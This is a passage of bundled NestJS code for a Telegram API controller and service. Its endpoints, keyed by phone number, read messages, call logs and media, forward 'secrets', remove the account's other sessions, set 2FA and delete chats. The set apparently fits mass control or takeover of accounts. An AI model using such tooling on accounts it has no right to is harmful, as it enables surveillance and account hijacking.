    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const addContacts_dto_1 = __webpack_require__(/*! ./dto/addContacts.dto */ "./src/components/Telegram/dto/addContacts.dto.ts");
const addContact_dto_1 = __webpack_require__(/*! ./dto/addContact.dto */ "./src/components/Telegram/dto/addContact.dto.ts");
let TelegramController = class TelegramController {
    constructor(telegramService) {
        this.telegramService = telegramService;
    }
    async connectToTelegram(mobile) {
        return await this.telegramService.createClient(mobile);
    }
    async connectClient(mobile) {
        await this.connectToTelegram(mobile);
        return 'Client connected successfully';
    }
    async disconnect(mobile) {
        return await this.telegramService.deleteClient(mobile);
    }
    async disconnectAll() {
        await this.telegramService.disconnectAll();
        return 'Clients disconnected successfully';
    }
    async getMessages(mobile, username, limit = 8) {
        await this.connectToTelegram(mobile);
        return this.telegramService.getMessages(mobile, username, limit);
    }
    async getMessagesNew(mobile, chatId, offset, limit = 20) {
        await this.telegramService.createClient(mobile, false, false);
        const messages = await this.telegramService.getMessagesNew(mobile, chatId, offset, limit);
        return messages;
    }
    async getChatId(mobile, username) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getChatId(mobile, username);
    }
    async sendInlineMessage(mobile, chatId, message, url) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.sendInlineMessage(mobile, chatId, message, url);
    }
    async lastActiveTime(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getLastActiveTime(mobile);
    }
    async joinChannels(mobile, channels) {
        await this.connectToTelegram(mobile);
        return 'Joining Channels';
    }
    async removeOtherAuths(mobile) {
        await this.connectToTelegram(mobile);
        await this.telegramService.removeOtherAuths(mobile);
        return 'Authorizations removed successfully';
    }
    async getSelfMsgsInfo(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getSelfMsgsInfo(mobile);
    }
    async createGroup(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.createGroup(mobile);
    }
    async forwardSecrets(mobile, fromId) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.forwardSecrets(mobile, fromId);
    }
    async joinChannelAndForward(mobile, fromId, channel) {
        await this.telegramService.createClient(mobile, false, false);
        return await this.telegramService.joinChannelAndForward(mobile, fromId, channel);
    }
    async leaveChannel(mobile, channel) {
        await this.connectToTelegram(mobile);
        this.telegramService.leaveChannel(mobile, channel);
        return "Started Leaving Channels";
    }
    async getCallLog(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getCallLog(mobile);
    }
    async getMe(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getMe(mobile);
    }
    async getMedia(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getmedia(mobile);
    }
    async getChannelInfo(mobile, sendIds = false) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getChannelInfo(mobile, sendIds);
    }
    async leaveChannels(mobile) {
        await this.connectToTelegram(mobile);
        this.telegramService.leaveChannels(mobile);
        return "Started Leaving Channels";
    }
    async getAuths(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getAuths(mobile);
    }
    async set2Fa(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.set2Fa(mobile);
    }
    async setProfilePic(mobile, name) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.setProfilePic(mobile, name);
    }
    async updatePrivacy(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.updatePrivacy(mobile);
    }
    async updateUsername(mobile, username) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.updateUsername(mobile, username);
    }
    async getGrpMembers(mobile, username) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.getGrpMembers(mobile, username);
    }
    async addContact(addContactDto) {
        const { mobile, data, prefix } = addContactDto;
        await this.connectToTelegram(mobile);
        return this.telegramService.addContact(mobile, data, prefix);
    }
    async addContacts(addContactsDto) {
        const { mobile, phoneNumbers, prefix } = addContactsDto;
        await this.connectToTelegram(mobile);
        return this.telegramService.addContacts(mobile, phoneNumbers, prefix);
    }
    async newSession(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.createNewSession(mobile);
    }
    async updateName(mobile, firstName, about) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.updateNameandBio(mobile, firstName, about);
    }
    async getMediaMetadata(mobile, chatId, offset, limit) {
        await this.telegramService.createClient(mobile, false, false);
        return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);
    }
    async downloadMediaFile(mobile, messageId, chatId, res) {
        await this.connectToTelegram(mobile);
        await this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);
    }
    async downloadProfilePic(mobile, index, res) {
        await this.connectToTelegram(mobile);
        try {
            const filePath = await this.telegramService.downloadProfilePic(mobile, index);
            if (!filePath) {
                return res.status(404).send('Profile photo not found.');
            }
            res.download(filePath, 'profile_pic.jpg', (err) => {
                if (err) {
                    console.error('Error sending the file:', err);
                    res.status(500).send('Error downloading the file.');
                }
                fs.unlink(filePath, (err) => {
                    if (err) {
                        console.error('Error deleting the file:', err);
                    }
                });
            });
        }
        catch (error) {
            console.error('Error in endpoint:', error);
            res.status(500).send('An error occurred.');
        }
    }
    async forrward(mobile, chatId, messageId) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.forwardMessage(mobile, chatId, messageId);
    }
    async deleteChat(mobile, chatId) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.deleteChat(mobile, chatId);
    }
    async deleteProfilePics(mobile) {
        await this.connectToTelegram(mobile);
        return await this.telegramService.deleteProfilePhotos(mobile);
    }
};
exports.TelegramController = TelegramController;
__decorate([
    (0, common_1.Get)('connect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create and connect a new Telegram client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "connectClient", null);
__decorate([
    (0, common_1.Get)('disconnect/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create and connect a new Telegram client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnect", null);
__decorate([
    (0, common_1.Get)('disconnectAll'),
    (0, swagger_1.ApiOperation)({ summary: 'Create and connect a new Telegram client' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "disconnectAll", null);
__decorate([
    (0, common_1.Get)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get messages from Telegram' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'Username to fetch messages from', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Limit the number of messages', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __param(2, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessages", null);
__decorate([
    (0, common_1.Get)('messagesNew/:mobile'),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Username to fetch messages from', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Limit the number of messages', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'offset', description: 'offset the number of messages', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('offset')),
    __param(3, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessagesNew", null);
__decorate([
    (0, common_1.Get)('chatid/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat ID for a username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'Username to fetch chat ID for', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatId", null);
__decorate([
    (0, common_1.Get)('sendInlineMessage/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat ID for a username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'chat ID of user', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'message', description: 'message ID of user', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'url', description: 'url ID of user', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('message')),
    __param(3, (0, common_1.Query)('url')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendInlineMessage", null);
__decorate([
    (0, common_1.Get)('lastActiveTime/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get Last Active time of a user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "lastActiveTime", null);
__decorate([
    (0, common_1.Post)('joinchannels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Join channels' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)('channels')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "joinChannels", null);
__decorate([
    (0, common_1.Get)('removeauths/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove other authorizations' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "removeOtherAuths", null);
__decorate([
    (0, common_1.Get)('selfmsgsinfo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSelfMsgsInfo", null);
__decorate([
    (0, common_1.Get)('createGroup/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createGroup", null);
__decorate([
    (0, common_1.Get)('forwardSecrets/:mobile/:fromId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('fromId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardSecrets", null);
__decorate([
    (0, common_1.Get)('joinChannelAndForward/:mobile/:fromId/:channel'),
    (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('fromId')),
    __param(2, (0, common_1.Param)('channel')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "joinChannelAndForward", null);
__decorate([
    (0, common_1.Get)('leaveChannel/:mobile/:channel'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('channel')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "leaveChannel", null);
__decorate([
    (0, common_1.Get)('getCallLog/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get CallLog  info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getCallLog", null);
__decorate([
    (0, common_1.Get)('getMe/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get me  info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMe", null);
__decorate([
    (0, common_1.Get)('getMedia/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get me  info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMedia", null);
__decorate([
    (0, common_1.Get)('channelinfo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'sendIds', description: 'Whether to send IDs or not', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('sendIds')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChannelInfo", null);
__decorate([
    (0, common_1.Get)('leaveChannels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "leaveChannels", null);
__decorate([
    (0, common_1.Get)('auths/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get authorizations' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getAuths", null);
__decorate([
    (0, common_1.Get)('set2Fa/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set 2Fa' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "set2Fa", null);
__decorate([
    (0, common_1.Get)('setprofilepic/:mobile/:name'),
    (0, swagger_1.ApiOperation)({ summary: 'Set Profile Picture' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiParam)({ name: 'name', description: 'Profile name', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('name')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setProfilePic", null);
__decorate([
    (0, common_1.Get)('updatePrivacy/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Privacy Settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacy", null);
__decorate([
    (0, common_1.Get)('UpdateUsername/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'New username', type: String, required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateUsername", null);
__decorate([
    (0, common_1.Get)('getGrpMembers/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'New username', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGrpMembers", null);
__decorate([
    (0, common_1.Post)('addcontact'),
    (0, swagger_1.ApiOperation)({ summary: 'Add multiple contacts' }),
    (0, swagger_1.ApiBody)({
        description: 'Add contacts with a phone number array and a prefix for names',
        type: addContact_dto_1.AddContactDto
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Successfully added contacts.',
        schema: {
            example: {
                success: true,
                addedContacts: 5,
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Error adding contacts.',
        schema: {
            example: {
                success: false,
                error: 'Error message',
            },
        },
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [addContact_dto_1.AddContactDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addContact", null);
__decorate([
    (0, common_1.Post)('addcontacts'),
    (0, swagger_1.ApiOperation)({ summary: 'Add multiple contacts' }),
    (0, swagger_1.ApiBody)({
        description: 'Add contacts with a phone number array and a prefix for names',
        type: addContacts_dto_1.AddContactsDto
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Successfully added contacts.',
        schema: {
            example: {
                success: true,
                addedContacts: 5,
            },
        },
    }),
    (0, swagger_1.ApiResponse)({
        status: 400,
        description: 'Error adding contacts.',
        schema: {
            example: {
                success: false,
                error: 'Error message',
            },
        },
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [addContacts_dto_1.AddContactsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addContacts", null);
__decorate([
    (0, common_1.Get)('newSession/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "newSession", null);
__decorate([
    (0, common_1.Get)('updateNameandBio/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Name' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', description: 'First Name', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'about', description: 'About', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('firstName')),
    __param(2, (0, common_1.Query)('about')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateName", null);
__decorate([
    (0, common_1.Get)('metadata'),
    __param(0, (0, common_1.Query)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('offset')),
    __param(3, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMediaMetadata", null);
__decorate([
    (0, common_1.Get)('download'),
    __param(0, (0, common_1.Query)('mobile')),
    __param(1, (0, common_1.Query)('messageId')),
    __param(2, (0, common_1.Query)('chatId')),
    __param(3, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "downloadMediaFile", null);
__decorate([
    (0, common_1.Get)('downloadProfilePic'),
    __param(0, (0, common_1.Query)('mobile')),
    __param(1, (0, common_1.Query)('index')),
    __param(2, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "downloadProfilePic", null);
__decorate([
    (0, common_1.Get)('forward/:mobile/:chatId/:messageId'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'chatId of user', type: String }),
    (0, swagger_1.ApiParam)({ name: 'messageId', description: 'messageId of message', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('chatId')),
    __param(2, (0, common_1.Param)('messageId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forrward", null);
__decorate([
    (0, common_1.Get)('deleteChat/:mobile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiParam)({ name: 'chatId', description: 'chatId of user', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteChat", null);
__decorate([
    (0, common_1.Get)('deleteProfilePics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteProfilePics", null);
exports.TelegramController = TelegramController = __decorate([
    (0, common_1.Controller)('telegram'),
    (0, swagger_1.ApiTags)('Telegram'),
    __metadata("design:paramtypes", [Telegram_service_1.TelegramService])
], TelegramController);


/***/ }),

/***/ "./src/components/Telegram/Telegram.module.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/Telegram.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const Telegram_controller_1 = __webpack_require__(/*! ./Telegram.controller */ "./src/components/Telegram/Telegram.controller.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
let TelegramModule = class TelegramModule {
};
exports.TelegramModule = TelegramModule;
exports.TelegramModule = TelegramModule = __decorate([
    (0, common_1.Module)({
        imports: [
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            buffer_client_module_1.BufferClientModule,
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule)
        ],
        controllers: [Telegram_controller_1.TelegramController],
        providers: [Telegram_service_1.TelegramService],
        exports: [Telegram_service_1.TelegramService]
    })
], TelegramModule);


/***/ }),

/***/ "./src/components/Telegram/Telegram.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/Telegram/Telegram.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var TelegramService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramService = void 0;
const buffer_client_service_1 = __webpack_require__(/*! ./../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ./TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
